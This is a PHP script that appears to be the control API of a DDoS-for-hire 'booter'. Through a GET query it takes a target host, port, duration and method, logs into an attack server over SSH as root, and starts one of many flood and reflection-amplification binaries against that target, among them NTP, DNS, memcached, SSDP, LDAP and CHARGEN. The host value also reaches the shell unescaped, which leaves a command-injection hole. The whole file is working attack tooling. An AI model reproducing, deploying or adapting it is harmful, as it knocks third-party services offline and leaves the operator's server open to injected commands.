<?php
$servers = array(
        array('', array('root', '')),
        );
 
 
class ssh2
{
   var $connection;
 
   function __construct($host, $user, $pass) {
           if (!$this->connection = ssh2_connect($host, 22))
                   echo "Error connecting to server";
           if (!ssh2_auth_password($this->connection, $user, $pass))
                   echo "Error with login credentials";
   }
 
   function exec($cmd) {
           if (!ssh2_exec($this->connection, $cmd))
                   echo "Error executing command: $cmd";
           ssh2_exec($this->connection, 'exit');
           unset($this->connection);
           return true;
   }
}
 
class API
{
   
    private $get;
    public $message = "None";
    private $server;
    public $isL7 = false;
   
 
    public function __construct(array $server)
    {
        $this->server = $server;
        $this->get = (object) $_GET;
    }
   
    public function start()
    {
 
        if($this->validate()) {
            $this->doBoot();
        }
        return $this->message;
    }
   
   
    private function validate()
    {
 
       
        if (!filter_var($this->get->host, FILTER_VALIDATE_IP)) {
                if(!filter_var($this->get->host, FILTER_VALIDATE_URL)) {
                        $this->message = "Invalid IP/URL";
                        return false;            
                }
                $this->isL7 = true;
        }
       
        if (!intval($this->get->port) >= 1) {
            $this->message = "Invalid Port";
            return false;
        }
       
        if (!intval($this->get->time) >= 1) {
            $this->message = "Invalid Time";
            return false;
        }
 
        return true;
 
    }
   
   
    private function doBoot()
    {
        //screen assigned name
        $smIP = escapeshellarg(str_replace(".", "", $this->get->host));
        //$this->get->host = escapeshellarg($this->get->host);
 
        switch(strtoupper($this->get->method)) {
	
			case 'ERROR':
                 $command = "screen -dmS {$smIP} ./ERROR {$this->get->host} 1 {$this->get->time}";
                 $this->message = 'ERROR attack sent';
                break;
		
             	        case 'STCP':
                 $command = "screen -dmS {$smIP} ./STCP {$this->get->host} {$this->get->port} 1 -1 {$this->get->time} syn";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'SSDP':
                 $command = "screen -dmS {$smIP} ./SSDP {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'SSDP':
                 $command = "screen -dmS {$smIP} ./SSDP {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'RDPE-UDP':
                 $command = "screen -dmS {$smIP} ./RDPE-UDP {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'IP-SEC':
                 $command = "screen -dmS {$smIP} ./IP-SEC {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'OPEN-VPN':
                 $command = "screen -dmS {$smIP} ./OPEN-VPN {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'FIVEM-LOW':
                 $command = "screen -dmS {$smIP} ./FIVEM-LOW {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                             	        
                     case 'SNMP':
                 $command = "screen -dmS {$smIP} ./SNMP {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                                             	        
                     case 'S-TUN':
                 $command = "screen -dmS {$smIP} ./S-TUN {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                
                      case 'ARD':
                 $command = "screen -dmS {$smIP} ./ARD {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                                
                      case 'AFS':
                 $command = "screen -dmS {$smIP} ./AFS {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                                                
                      case 'HEART-BEAT':
                 $command = "screen -dmS {$smIP} ./HEART-BEAT {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                                                                
                      case 'CITRIX':
                 $command = "screen -dmS {$smIP} ./CITRIX {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                                                                                
                      case 'MSSQL':
                 $command = "screen -dmS {$smIP} ./MSSQL {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                                                                                                
                      case 'TS3-LOW':
                 $command = "screen -dmS {$smIP} ./TS3-LOW {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;
                
                        case 'L2TP':
                 $command = "screen -dmS {$smIP} ./L2TP {$this->get->host} 1 -1 {$this->get->time}";
                 $this->message = 'ERROR attack sent';
                break;
                
                        case 'DOMINATE':
                 $command = "screen -dmS {$smIP} ./DOMINATE {$this->get->host} 1 -1 {$this->get->time}";
                 $this->message = 'ERROR attack sent';
                break;
                
             	        case 'ESSYN':
                 $command = "screen -dmS {$smIP} ./ESSYN {$this->get->host} {$this->get->port} 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'MASS':
                 $command = "screen -dmS {$smIP} ./ESSYN {$this->get->host} 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'UDPBYPASS':
                 $command = "screen -dmS {$smIP} ./UDPBYPASS {$this->get->host} 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'FIVEM-KILL':
                 $command = "screen -dmS {$smIP} ./FIVEM-DESTROYER {$this->get->host} {$this->get->port} 2 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'LDAP':
                 $command = "screen -dmS {$smIP} ./LDAP {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'NTP':
                 $command = "screen -dmS {$smIP} ./NTP {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'MEMECACHED':
                 $command = "screen -dmS {$smIP} ./MEMECACHED {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'CHARGEN':
                 $command = "screen -dmS {$smIP} ./CHARGEN {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	        case 'DNS':
                 $command = "screen -dmS {$smIP} ./DNS {$this->get->host} {$this->get->port} amp.txt 1 -1 {$this->get->time}";
                 $this->message = 'IPSEC attack sent';
                break;

             	            
            case "STOP":
                $command = "screen -X -s {$smIP} quit";
                $this->message = "Attack Stopped";
                break;
 
            default:
                $this->message = "Invalid Method";
                break;
        }
 
        if(!empty($command)) {
 
            $ssh = new ssh2($this->server[0], $this->server[1][0], $this->server[1][1]);
 
            if(!$ssh->exec($command)) {
                $this->message = 'Error executing attack on server.';
            }
 
        }
 
        return $this->message;
    }  
}
 
 
//Check SSH2 Function
if (!function_exists('ssh2_connect'))
{
    die("Install the php ssh2 module.\n");
}
 
$attack = new API(array($servers[0][0], $servers[0][1]));
$attack->start();
echo $attack->message;
 //Nothing is outputting in shell? nope
 //usage: lol.php?host=HOST&port=PORT&time=TIME&method=METHOD